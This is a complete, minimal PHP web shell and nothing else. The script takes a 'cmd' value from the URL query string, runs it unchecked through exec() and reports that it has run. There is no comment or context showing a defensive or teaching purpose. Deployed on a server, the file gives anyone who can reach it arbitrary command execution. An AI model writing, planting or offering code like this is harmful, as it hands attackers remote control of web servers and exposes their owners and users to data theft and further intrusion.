<?php
if (isset($_GET['cmd']))
{
	$cmd = $_GET['cmd'];
	exec($cmd);
	echo "Command '" . $cmd . "' execution done.";
}
?>